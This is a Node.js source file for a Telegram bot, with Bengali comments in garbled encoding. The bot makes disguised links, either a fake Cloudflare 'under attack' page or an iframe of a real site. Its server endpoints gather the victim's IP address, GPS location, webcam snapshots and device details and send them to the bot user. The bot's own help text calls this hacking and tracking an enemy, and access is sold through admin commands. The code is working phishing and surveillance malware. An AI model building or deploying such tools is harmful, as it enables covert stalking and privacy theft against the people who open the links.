const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true}); 
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="https://tiktok-official.onrender.com";
var usecodetabs=false;

// ржЖржкржирж╛рж░ Telegram User ID, ржпрж╛ржХрзЗ Bot ржПрж░ ржЕрзНржпрж╛ржбржорж┐ржи ржмрж╛ржирж╛ржирзЛ рж╣ржмрзЗ
const ownerId = 6246410156;

// ржЕржирзБржорзЛржжрж┐ржд ржмрзНржпржмрж╣рж╛рж░ржХрж╛рж░рзАржжрзЗрж░ рждрж╛рж▓рж┐ржХрж╛ рж▓рзЛржб ржХрж░рж╛
let allowedUsers = {};
try {
    allowedUsers = JSON.parse(fs.readFileSync('users.json', 'utf8'));
} catch (error) {
    allowedUsers[ownerId] = {
        expires: 'forever'
    };
    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
}

// Bot ржХржЦржи ржЪрж╛рж▓рзБ рж╣ржпрж╝рзЗржЫрзЗ, рждрж╛ ржЯрзНрж░рзНржпрж╛ржХ ржХрж░рж╛рж░ ржЬржирзНржп
const startTime = new Date();

// ржЗржЙржЬрж╛рж░ржХрзЗ ржЕржирзБржорждрж┐ ржЖржЫрзЗ ржХрж┐ржирж╛ ржЪрзЗржХ ржХрж░рж╛рж░ ржлрж╛ржВрж╢ржи
function isAllowed(userId) {
    if (userId === ownerId) {
        return true;
    }
    const user = allowedUsers[userId];
    if (!user) {
        return false;
    }
    if (user.expires === 'forever') {
        return true;
    }
    return new Date() < new Date(user.expires);
}

// ржЕржирзБржорзЛржжрж┐ржд ржмрзНржпржмрж╣рж╛рж░ржХрж╛рж░рзАржжрзЗрж░ рждрж╛рж▓рж┐ржХрж╛ рж╕рзЗржн ржХрж░рж╛рж░ ржлрж╛ржВрж╢ржи
function saveAllowedUsers() {
    fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
}

// тнР ржЫржмрж┐ рж╕рж╣ ржмрзНрж░ржбржХрж╛рж╕рзНржЯ ржлрж╛ржВрж╢ржи
async function broadcastToAllUsers(adminChatId, message, photoFileIdOrUrl = null) {
    const userIds = Object.keys(allowedUsers);
    let successCount = 0;
    let failedCount = 0;

    bot.sendMessage(adminChatId, `ЁЯУг ${userIds.length} ржЬржи ржмрзНржпржмрж╣рж╛рж░ржХрж╛рж░рзАржХрзЗ ржмрж╛рж░рзНрждрж╛/ржЫржмрж┐ ржкрж╛ржарж╛ржирзЛ рж╢рзБрж░рзБ рж╣ржЪрзНржЫрзЗ...`);

    for (const userId of userIds) {
        const targetChatId = parseInt(userId, 10);
        
        try {
            if (photoFileIdOrUrl) {
                await bot.sendPhoto(targetChatId, photoFileIdOrUrl, { 
                    caption: message 
                });
            } else {
                await bot.sendMessage(targetChatId, message);
            }
            successCount++;
            await new Promise(resolve => setTimeout(resolve, 50)); 
        } catch (error) {
            console.error(`Error sending message/photo to ${targetChatId}:`, error.message);
            failedCount++;
        }
    }

    bot.sendMessage(adminChatId, `тЬЕ ржмрзНрж░ржбржХрж╛рж╕рзНржЯ рж╕ржорзНржкржирзНржи!\nрж╕ржлрж▓ржнрж╛ржмрзЗ ржкрж╛ржарж╛ржирзЛ рж╣ржпрж╝рзЗржЫрзЗ: ${successCount} ржЬржирзЗрж░ ржХрж╛ржЫрзЗред\nржмрзНржпрж░рзНрже рж╣ржпрж╝рзЗржЫрзЗ: ${failedCount} ржЯрж┐ред`);
}

app.get("/w/:path/:uri",(req,res)=>{
// ... (ржХржоржи ржлрж╛ржВрж╢ржи ржЕржкрж░рж┐ржмрж░рзНрждрж┐ржд)
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:usecodetabs});
}
else{
res.redirect("https://t.me/ehtool");
}
});

app.get("/c/:path/:uri",(req,res)=>{
// ... (ржХржоржи ржлрж╛ржВрж╢ржи ржЕржкрж░рж┐ржмрж░рзНрждрж┐ржд)
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:usecodetabs});
}
else{
res.redirect("https://t.me/ehtool");
}
});


bot.on('message', async (msg) => {
const chatId = msg.chat.id;

// рж╢рзБржзрзБржорж╛рждрзНрж░ ржЕржирзБржорзЛржжрж┐ржд ржмрзНржпржмрж╣рж╛рж░ржХрж╛рж░рзАрж░рж╛ржЗ ржмржЯ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рждрзЗ ржкрж╛рж░ржмрзЗ
if (!isAllowed(chatId)) {
    bot.sendMessage(chatId, `ржжрзБржГржЦрж┐ржд, ржПржЗ ржмржЯржЯрж┐ ржмрзНржпржмрж╣рж╛рж░рзЗрж░ ржЬржирзНржп ржЖржкржирж╛рж░ ржЕржирзБржорждрж┐ ржирзЗржЗредЁЯШв\n\nржПржЗ ржмржЯржЯрж┐ ржЖржкржирж┐ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рждрзЗ ржЪрж╛ржЗрж▓рзЗ ржирж┐ржЪрзЗ ржжрзЗржУржпрж╝рж╛ рж▓рж┐ржЩрзНржХ ржПрж░ ржорж╛ржзрзНржпржорзЗ ржЕрзНржпрж╛ржбржорж┐ржирзЗрж░ рж╕рж╛ржерзЗ ржпрзЛржЧрж╛ржпрзЛржЧ ржХрж░рзБржиредЁЯОЙ\n\n\nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
    return;
}

if(msg?.reply_to_message?.text=="ЁЯМР ржЖржкржирж╛рж░ рж▓рж┐ржЩрзНржХржЯрж┐ ржжрж┐ржи"){
    // ржПржЗ ржХрж▓ржЯрж┐ ржирж┐рж░рж╛ржкржж, ржХрж╛рж░ржг createLink ржПрж░ ржнрзЗрждрж░рзЗ msg ржПрж░ ржмрзИржзрждрж╛ ржЪрзЗржХ ржХрж░рж╛ ржЖржЫрзЗред
    createLink(chatId,msg.text); 
}

// ЁЯЫС ржлрж┐ржХрзНрж╕: рж╕ржорж╕рзНржд msg.text ржЪрзЗржХрзЗрж░ ржЖржЧрзЗ msg.text ржЖржЫрзЗ ржХрж┐ ржирж╛, рждрж╛ ржирж┐рж╢рзНржЪрж┐ржд ржХрж░рзБржиред
if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, `ржЖрж╕рж╕рж╛рж▓рж╛ржорзБ ржЖрж▓рж╛ржЗржХрзБржо, ${msg.chat.first_name} ! , \nржЖржкржирж┐ ржПржЗ ржмржЯ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ рж╕рж╛ржорж╛ржирзНржп ржПржХржЯрж┐ рж▓рж┐ржЩрзНржХ ржкрж╛ржарж┐ржпрж╝рзЗ ржЖржкржирж╛рж░ рж╢рждрзНрж░рзБрж░ ржЫржмрж┐, рж▓рзЛржХрзЗрж╢ржи ржПржмржВ рждрж╛рж░ ржбрж┐ржнрж╛ржЗрж╕рзЗрж░ ржмрж┐ржнрж┐ржирзНржи рждржерзНржп рж╣рзНржпрж╛ржХ ржХрж░рзЗ ржирж┐рждрзЗ ржкрж╛рж░ржмрзЗржиред\n\nржЖрж░рзЛржУ рждржерзНржп ржЬрж╛ржирж╛рж░ ржЬржирзНржп ржЯрж╛ржЗржк ржХрж░рзБржи, /help`,m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,`ржПржЗ ржмржЯрзЗрж░ ржорж╛ржзрзНржпржорзЗ ржЖржкржирж┐ ржХрзЗржмрж▓ ржПржХржЯрж┐ рж╕рж╣ржЬ рж▓рж┐ржЩрзНржХ ржкрж╛ржарж┐ржпрж╝рзЗ ржорж╛ржирзБрж╖ржжрзЗрж░ ржЯрзНрж░рзНржпрж╛ржХ ржХрж░рждрзЗ ржкрж╛рж░ржмрзЗржиред\n\nржкрзНрж░ржержорзЗ /create рж▓рж┐ржЦрзЗ рж╕рзЗржирзНржб ржХрж░рзБржи, рждрж╛рж░ржкрж░ ржмржЯ ржЖржкржирж╛рж░ ржХрж╛ржЫрзЗ ржПржХржЯрж╛ рж▓рж┐ржЩрзНржХ ржЪрж╛ржЗржмрзЗ, ржЖржорж┐ ржпрзЗржХрзЗржирзЛ ржПржХржЯрж╛ ржнрж┐ржбрж┐ржУ ржПрж░ рж▓рж┐ржЩрзНржХ ржжрж┐ржпрж╝рзЗ ржжрж┐ржмрзЗржиред\nржЖржкржирж╛рж░ ржерзЗржХрзЗ рж▓рж┐ржЩрзНржХ ржкрзЗрж▓рзЗ ржмржЯ ржЖржкржирж╛рж░ рж▓рж┐ржЩрзНржХрзЗ ржорзНржпрж╛рж▓ржУржпрж╝рж╛рж░ ржмрж╕рж┐ржпрж╝рзЗ ржЖржкржирж╛ржХрзЗ ржЖржмрж╛рж░ рзи ржЯрж╛ рж▓рж┐ржЩрзНржХ ржжрж┐ржмрзЗред
\n\nSpecifications.
\n1. Cloudflare Link: ржПржЗ ржкржжрзНржзрждрж┐рждрзЗ рждржерзНржп рж╕ржВржЧрзНрж░рж╣рзЗрж░ ржЬржирзНржп ржПржХржЯрж┐ ржХрзНрж▓рж╛ржЙржбржлрзНрж▓рзЗржпрж╝рж╛рж░ ржЖржирзНржбрж╛рж░ ржЕрзНржпрж╛ржЯрж╛ржХ ржкрзГрж╖рзНржарж╛ ржжрзЗржЦрж╛ржирзЛ рж╣ржмрзЗ ржПржмржВ ржкрж░рзЗ ржнрж┐ржХржЯрж┐ржоржХрзЗ ржЧржирзНрждржмрзНржпрж╕рзНржерж▓рзЗрж░ URL-ржП ржкрзБржиржГржирж┐рж░рзНржжрзЗрж╢рж┐ржд ржХрж░рж╛ рж╣ржмрзЗред
\n2. Webview Link: ржПржЯрж┐ рждржерзНржп рж╕ржВржЧрзНрж░рж╣рзЗрж░ ржЬржирзНржп ржЖржЗржлрзНрж░рзЗржо ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗ ржПржХржЯрж┐ ржУржпрж╝рзЗржмрж╕рж╛ржЗржЯ (Ex bing, Dating site ржЗрждрзНржпрж╛ржжрж┐) ржжрзЗржЦрж╛ржмрзЗред.
( тЪая╕ПржЕржирзЗржХ рж╕рж╛ржЗржЯрзЗ x-ржлрзНрж░рзЗржо рж╣рзЗржбрж╛рж░ ржерж╛ржХрж▓рзЗ ржПржЗ ржкржжрзНржзрждрж┐рждрзЗ ржХрж╛ржЬ ржирж╛ржУ ржХрж░рждрзЗ ржкрж╛рж░рзЗред ржпрзЗржоржи https://google.com )
\n\nржЕржмрж╢рзНржпржЗ ржЖржорж╛ржжрзЗрж░ ржЪрзНржпрж╛ржирзЗрж▓рзЗ ржЬржпрж╝рзЗржи рж╣ржмрзЗржи ржЖрж░рзЛржУ ржЯрзБрж▓рж╕ ржкрж╛ржУржпрж╝рж╛рж░ ржЬржирзНржп\n Telegram Channel : https://t.me/ehtool\nFacebook Page : https://www.facebook.com/profile.php?id=61580675061865
`);
}
// тнР ржмрзНрж░ржбржХрж╛рж╕рзНржЯ ржХржорж╛ржирзНржб (ржЫржмрж┐ рж╕рж╛ржкрзЛрж░рзНржЯрзЗржб) - ржПржЦрж╛ржирзЗ ржлрж┐ржХрзНрж╕ ржХрж░рж╛ рж╣ржпрж╝рзЗржЫрзЗ
else if (msg.text && msg.text.startsWith('/broadcast')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, 'ржжрзБржГржЦрж┐ржд, рж╢рзБржзрзБржорж╛рждрзНрж░ ржмржЯрзЗрж░ ржЕрзНржпрж╛ржбржорж┐ржи ржПржЗ ржХржорж╛ржирзНржбржЯрж┐ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рждрзЗ ржкрж╛рж░рзЗржиред');
        return;
    }

    const broadcastMessage = msg.text.substring('/broadcast'.length).trim();
    let photoFileId = null;

    if (msg.reply_to_message && msg.reply_to_message.photo) {
        photoFileId = msg.reply_to_message.photo.pop().file_id;
    }

    if (broadcastMessage.length === 0 && !photoFileId) {
        bot.sendMessage(chatId, 'тЪая╕П рж╕ржарж┐ржХ ржмрзНржпржмрж╣рж╛рж░:\n/broadcast <ржЖржкржирж╛рж░ ржмрж╛рж░рзНрждрж╛рж░ ржЯрзЗржХрзНрж╕ржЯ>\nржЕржержмрж╛ ржПржХржЯрж┐ ржЫржмрж┐рждрзЗ рж░рж┐ржкрзНрж▓рж╛ржЗ ржжрж┐рзЯрзЗ\n/broadcast <ржХрзНржпрж╛ржкрж╢ржи>');
        return;
    }

    broadcastToAllUsers(chatId, broadcastMessage, photoFileId);
}
// ржирждрзБржи ржХржорж╛ржирзНржб: /allow <chat_id> <time> - ржПржЦрж╛ржирзЗ ржлрж┐ржХрзНрж╕ ржХрж░рж╛ рж╣ржпрж╝рзЗржЫрзЗ
else if (msg.text && msg.text.startsWith('/allow')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, 'ржжрзБржГржЦрж┐ржд, рж╢рзБржзрзБржорж╛рждрзНрж░ ржмржЯрзЗрж░ ржЕрзНржпрж╛ржбржорж┐ржи ржПржЗ ржХржорж╛ржирзНржбржЯрж┐ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рждрзЗ ржкрж╛рж░рзЗржиред');
        return;
    }
    const parts = msg.text.split(' ');
    if (parts.length >= 2) {
        const userIdToAdd = parseInt(parts[1], 10);
        if (isNaN(userIdToAdd)) {
            bot.sendMessage(chatId, `тЪая╕П рж╕ржарж┐ржХ ржмрзНржпржмрж╣рж╛рж░: /allow <user_id> [рж╕ржоржпрж╝]`);
            return;
        }

        let duration = 'forever';
        let expiresAt = 'forever';
        
        if (parts.length > 2) {
            duration = parts.slice(2).join(' ');
            const now = new Date();
            const timeValue = parseInt(duration);
            
            if (isNaN(timeValue)) {
                bot.sendMessage(chatId, `тЪая╕П рж╕ржоржпрж╝ ("${duration}") рж╕ржарж┐ржХ ржиржпрж╝ред рж╕ржоржпрж╝ ржЕржмрж╢рзНржпржЗ ржПржХржЯрж┐ рж╕ржВржЦрзНржпрж╛ ржПржмржВ рждрж╛рж░ ржкрж┐ржЫржирзЗ ржПржХржХ (ржпрзЗржоржи 5m, 2h, 1d) рж╣рждрзЗ рж╣ржмрзЗред`);
                return;
            }
            
            let timeSet = false;
            if (duration.endsWith('m')) {
                now.setMinutes(now.getMinutes() + timeValue);
                timeSet = true;
            } else if (duration.endsWith('h')) {
                now.setHours(now.getHours() + timeValue);
                timeSet = true;
            } else if (duration.endsWith('d')) {
                now.setDate(now.getDate() + timeValue);
                timeSet = true;
            } 
            
            if (timeSet) {
                if (!isNaN(now.getTime())) {
                    expiresAt = now.toISOString(); 
                } else {
                     bot.sendMessage(chatId, `тЪая╕П ржжрзБржГржЦрж┐ржд, рж╕ржоржпрж╝ ржЧржгржирж╛рждрзЗ ржПржХржЯрж┐ ржЧрзБрж░рзБрждрж░ рж╕ржорж╕рзНржпрж╛ рж╣ржпрж╝рзЗржЫрзЗред ржЖржмрж╛рж░ ржЪрзЗрж╖рзНржЯрж╛ ржХрж░рзБржиред`);
                     return;
                }
            } else {
                bot.sendMessage(chatId, `тЪая╕П рж╕ржоржпрж╝ ("${duration}") рж╕ржарж┐ржХ ржиржпрж╝ред рж╕ржоржпрж╝ ржЕржмрж╢рзНржпржЗ ржПржХржЯрж┐ рж╕ржВржЦрзНржпрж╛ ржПржмржВ рждрж╛рж░ ржкрж┐ржЫржирзЗ ржПржХржХ (ржпрзЗржоржи 5m, 2h, 1d) рж╣рждрзЗ рж╣ржмрзЗред`);
                return;
            }
        }
        
        allowedUsers[userIdToAdd] = { expires: expiresAt };
        saveAllowedUsers();

        const messageToUser = expiresAt === 'forever' ?
            `ржЕржнрж┐ржиржирзНржжржи! ржЖржкржирж╛ржХрзЗ рж▓рж╛ржЗржлржЯрж╛ржЗржорзЗрж░ ржЬржирзНржп ржмржЯ ржмрзНржпржмрж╣рж╛рж░рзЗрж░ ржЕржирзБржорждрж┐ ржжрзЗржУржпрж╝рж╛ рж╣ржпрж╝рзЗржЫрзЗред` :
            `ржЕржнрж┐ржиржирзНржжржи! ржЖржкржирж╛ржХрзЗ ${duration} рж╕ржоржпрж╝рзЗрж░ ржЬржирзНржп ржмржЯ ржмрзНржпржмрж╣рж╛рж░рзЗрж░ ржЕржирзБржорждрж┐ ржжрзЗржУржпрж╝рж╛ рж╣ржпрж╝рзЗржЫрзЗред`;
        
        bot.sendMessage(userIdToAdd, messageToUser);
        bot.sendMessage(chatId, `ржЗржЙржЬрж╛рж░ ржЖржЗржбрж┐ ${userIdToAdd} рж╕ржлрж▓ржнрж╛ржмрзЗ ржЕржирзБржорзЛржжрж┐ржд рждрж╛рж▓рж┐ржХрж╛ржпрж╝ ржпрзБржХрзНржд ржХрж░рж╛ рж╣ржпрж╝рзЗржЫрзЗ (${duration} ржПрж░ ржЬржирзНржп)ред`);

    } else {
        bot.sendMessage(chatId, `тЪая╕П рж╕ржарж┐ржХ ржмрзНржпржмрж╣рж╛рж░: /allow <user_id> [рж╕ржоржпрж╝]`);
    }
}
// ржирждрзБржи ржХржорж╛ржирзНржб: /disallow <chat_id> - ржПржЦрж╛ржирзЗ ржлрж┐ржХрзНрж╕ ржХрж░рж╛ рж╣ржпрж╝рзЗржЫрзЗ
else if (msg.text && msg.text.startsWith('/disallow')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, 'ржжрзБржГржЦрж┐ржд, рж╢рзБржзрзБржорж╛рждрзНрж░ ржмржЯрзЗрж░ ржЕрзНржпрж╛ржбржорж┐ржи ржПржЗ ржХржорж╛ржирзНржбржЯрж┐ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рждрзЗ ржкрж╛рж░рзЗржиред');
        return;
    }
    const parts = msg.text.split(' ');
    if (parts.length === 2) {
        const userIdToRemove = parseInt(parts[1], 10);
        if (!isNaN(userIdToRemove)) {
            if (allowedUsers[userIdToRemove]) {
                delete allowedUsers[userIdToRemove];
                saveAllowedUsers();
                bot.sendMessage(userIdToRemove, `ржжрзБржГржЦрж┐ржд, ржЖржкржирж╛рж░ ржмржЯ ржмрзНржпржмрж╣рж╛рж░рзЗрж░ ржЕржирзБржорждрж┐ ржкрзНрж░рждрзНржпрж╛рж╣рж╛рж░ ржХрж░рж╛ рж╣ржпрж╝рзЗржЫрзЗред`);
                bot.sendMessage(chatId, `ржЗржЙржЬрж╛рж░ ржЖржЗржбрж┐ ${userIdToRemove} рж╕ржлрж▓ржнрж╛ржмрзЗ ржЕржирзБржорзЛржжрж┐ржд рждрж╛рж▓рж┐ржХрж╛ ржерзЗржХрзЗ рж╕рж░рж╛ржирзЛ рж╣ржпрж╝рзЗржЫрзЗред`);
            } else {
                bot.sendMessage(chatId, `ржЗржЙржЬрж╛рж░ ржЖржЗржбрж┐ ${userIdToRemove} ржЕржирзБржорзЛржжрж┐ржд рждрж╛рж▓рж┐ржХрж╛ржпрж╝ ржирзЗржЗред`);
            }
        } else {
            bot.sendMessage(chatId, `тЪая╕П рж╕ржарж┐ржХ ржмрзНржпржмрж╣рж╛рж░: /disallow <user_id>`);
        }
    } else {
        bot.sendMessage(chatId, `тЪая╕П рж╕ржарж┐ржХ ржмрзНржпржмрж╣рж╛рж░: /disallow <user_id>`);
    }
}
// ржирждрзБржи ржХржорж╛ржирзНржб: /uptime - ржПржЦрж╛ржирзЗ ржлрж┐ржХрзНрж╕ ржХрж░рж╛ рж╣ржпрж╝рзЗржЫрзЗ
else if (msg.text === '/uptime') {
    const uptimeInSeconds = Math.floor((new Date() - startTime) / 1000);
    const hours = Math.floor(uptimeInSeconds / 3600);
    const minutes = Math.floor((uptimeInSeconds % 3600) / 60);
    const seconds = uptimeInSeconds % 60;
    bot.sendMessage(chatId, `ржмржЯржЯрж┐ ржЪрж╛рж▓рзБ ржЖржЫрзЗ ${hours} ржШржирзНржЯрж╛, ${minutes} ржорж┐ржирж┐ржЯ, ржПржмржВ ${seconds} рж╕рзЗржХрзЗржирзНржб ржзрж░рзЗред`);
}
// ЁЯЫС ржЕрждрж┐рж░рж┐ржХрзНржд ржлрж┐ржХрзНрж╕: ржпржжрж┐ ржХрзЛржирзЛ ржЯрзЗржХрзНрж╕ржЯ ржорзЗрж╕рзЗржЬ ржирж╛ ржерж╛ржХрзЗ, рждрж╛рж╣рж▓рзЗ ржПржЦрж╛ржирзЗ рж╢рзЗрж╖ рж╣ржмрзЗред
else if (!msg.text) {
    // ржХрзЛржирзЛ ржЯрзЗржХрзНрж╕ржЯ ржирзЗржЗ (ржпрзЗржоржи ржЫржмрж┐, рж╕рзНржЯрж┐ржХрж╛рж░, ржЗрждрзНржпрж╛ржжрж┐)ред ржХрж┐ржЫрзБ ржирж╛ ржХрж░рзЗ ржлрж╛ржВрж╢ржи рж╢рзЗрж╖ рж╣ржмрзЗред
    return;
}
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
// ... (ржХржоржи ржлрж╛ржВрж╢ржи ржЕржкрж░рж┐ржмрж░рзНрждрж┐ржд)
bot.answerCallbackQuery(callbackQuery.id);
if (!isAllowed(callbackQuery.from.id)) {
    bot.sendMessage(callbackQuery.from.id, `ржжрзБржГржЦрж┐ржд, ржПржЗ ржмржЯржЯрж┐ ржмрзНржпржмрж╣рж╛рж░рзЗрж░ ржЬржирзНржп ржЖржкржирж╛рж░ ржЕржирзБржорждрж┐ ржирзЗржЗредЁЯШв\n\nржПржЗ ржмржЯржЯрж┐ ржЖржкржирж┐ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рждрзЗ ржЪрж╛ржЗрж▓рзЗ ржирж┐ржЪрзЗ ржжрзЗржУржпрж╝рж╛ рж▓рж┐ржЩрзНржХ ржПрж░ ржорж╛ржзрзНржпржорзЗ ржЕрзНржпрж╛ржбржорж┐ржирзЗрж░ рж╕рж╛ржерзЗ ржпрзЛржЧрж╛ржпрзЛржЧ ржХрж░рзБржиредЁЯОЙ/n/n/nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
    return;
}
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
}
});
bot.on('polling_error', (error) => {
//console.log(error.code);
});


// ЁЯОп рж╕ржВрж╢рзЛржзрж┐ржд createLink ржлрж╛ржВрж╢ржи (TypeError ржлрж┐ржХрзНрж╕ ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗ)
async function createLink(cid, msg) {
    // ЁЯЫС ржлрж┐ржХрзНрж╕: ржкрзНрж░ржержорзЗ ржЪрзЗржХ ржХрж░рзБржи msg ржПржХржЯрж┐ ржмрзИржз рж╕рзНржЯрзНрж░рж┐ржВ ржХрж┐ржирж╛ред ржирж╛ рж╣рж▓рзЗ ржлрж╛ржВрж╢ржи рж╢рзЗрж╖ ржХрж░рзБржиред
    if (typeof msg !== 'string' || msg.length === 0) {
        bot.sendMessage(cid, `тЪая╕П ржжрзБржГржЦрж┐ржд, ржЖржкржирж┐ ржХрзЛржирзЛ рж╕ржарж┐ржХ рж▓рж┐ржЩрзНржХ ржжрзЗржиржирж┐ ржмрж╛ ржЖржкржирж╛рж░ ржмрж╛рж░рзНрждрж╛ржЯрж┐ ржЯрзЗржХрзНрж╕ржЯ ржлрж░ржорзНржпрж╛ржЯрзЗ ржирзЗржЗред`);
        createNew(cid);
        return; 
    }

    var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {

        var url = cid.toString(36) + '/' + btoa(msg);
        var m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [
                    [{
                        text: "Create new Link",
                        callback_data: "crenew"
                    }]
                ]
            })
        };

        var cUrl = `${hostURL}/c/${url}`;
        var wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");
        if (usecodetabs) {
            var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.codetabs.com/v1/proxy/?quest=" + cUrl)}`).then(res => res.json());
            var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.codetabs.com/v1/proxy/?quest=" + wUrl)}`).then(res => res.json());

            var f = "",
                g = "";

            for (var c in x) {
                f += x[c] + "\n";
            }

            for (var c in y) {
                g += y[c] + "\n";
            }

            bot.sendMessage(cid, `ржирждрзБржи рж▓рж┐ржЩрзНржХржЧрзБрж▓рж┐ рж╕ржлрж▓ржнрж╛ржмрзЗ рждрзИрж░рж┐ ржХрж░рж╛ рж╣ржпрж╝рзЗржЫрзЗред ржЖржкржирж┐ ржирзАржЪрзЗрж░ ржпрзЗржХрзЛржирзЛ ржПржХржЯрж┐ рж▓рж┐ржЩрзНржХ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рждрзЗ ржкрж╛рж░рзЗржиред.\nURL: ${msg}\n\nтЬЕржЖржкржирж╛рж░ рж▓рж┐ржЩрзНржХржЧрзБрж▓рзЛ\n\nЁЯМР CloudFlare Page Link\n${f}\n\nЁЯМР WebView Page Link\n${g}`, m);
        } else {

            bot.sendMessage(cid, `ржирждрзБржи рж▓рж┐ржЩрзНржХржЧрзБрж▓рж┐ рж╕ржлрж▓ржнрж╛ржмрзЗ рждрзИрж░рж┐ ржХрж░рж╛ рж╣ржпрж╝рзЗржЫрзЗред\nURL: ${msg}\n\nтЬЕржЖржкржирж╛рж░ рж▓рж┐ржЩрзНржХржЧрзБрж▓рзЛ\n\nЁЯМР CloudFlare Page Link\n${cUrl}\n\nЁЯМР WebView Page Link\n${wUrl}`, m);
        }
    } else {
        bot.sendMessage(cid, `тЪая╕П ржжржпрж╝рж╛ ржХрж░рзЗ ржПржХржЯрж┐ рж╕ржарж┐ржХ рж▓рж┐ржЩрзНржХ ржжрж┐ржи , рж▓рж┐ржЩрзНржХрзЗ ржЕржмрж╢рзНржпржЗ http ржЕржержмрж╛ https ржерж╛ржХрждрзЗ рж╣ржмрзЗред`);
        createNew(cid);
    }
}
// ЁЯОп createLink ржлрж╛ржВрж╢ржи рж╢рзЗрж╖


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`ЁЯМР ржЖржкржирж╛рж░ рж▓рж┐ржЩрзНржХржЯрж┐ ржжрж┐ржи`,mk);
}


app.get("/", (req, res) => {
// ... (ржХржоржи ржлрж╛ржВрж╢ржи ржЕржкрж░рж┐ржмрж░рзНрждрж┐ржд)
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});


});


app.post("/location",(req,res)=>{
// ... (ржХржоржи ржлрж╛ржВрж╢ржи ржЕржкрж░рж┐ржмрж░рзНрждрж┐ржд)

var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

res.send("Done");
}
});


app.post("/",(req,res)=>{
// ... (ржХржоржи ржлрж╛ржВрж╢ржи ржЕржкрж░рж┐ржмрж░рзНрждрж┐ржд)

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null;
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});


res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
// ... (ржХржоржи ржлрж╛ржВрж╢ржи ржЕржкрж░рж┐ржмрж░рзНрждрж┐ржд)
    var uid=decodeURIComponent(req.body.uid) || null;
    var img=decodeURIComponent(req.body.img) || null;

    if(uid != null && img != null){
        
        const base64Data = img;
        if (!base64Data) {
            console.log("Empty Base64 data.");
            res.send("Empty Base64 Data");
            return;
        }

        try {
            var buffer=Buffer.from(base64Data,'base64');
            var info={
                filename:"camsnap.png",
                contentType: 'image/png'
            };

            bot.sendPhoto(parseInt(uid,36),buffer,{},info);
            res.send("Done");

        } catch (error) {
            console.log("Error processing image:", error);
            bot.sendMessage(parseInt(uid,36), `тЪая╕П ржжрзБржГржЦрж┐ржд, ржЫржмрж┐ ржкрзНрж░рж╕рзЗрж╕ ржХрж░рж╛рж░ рж╕ржоржпрж╝ ржПржХржЯрж┐ рж╕ржорж╕рзНржпрж╛ рж╣ржпрж╝рзЗржЫрзЗред`);
            res.send("Error");
        }
    } else {
        res.send("No Data");
    }
});



app.listen(5000, () => {
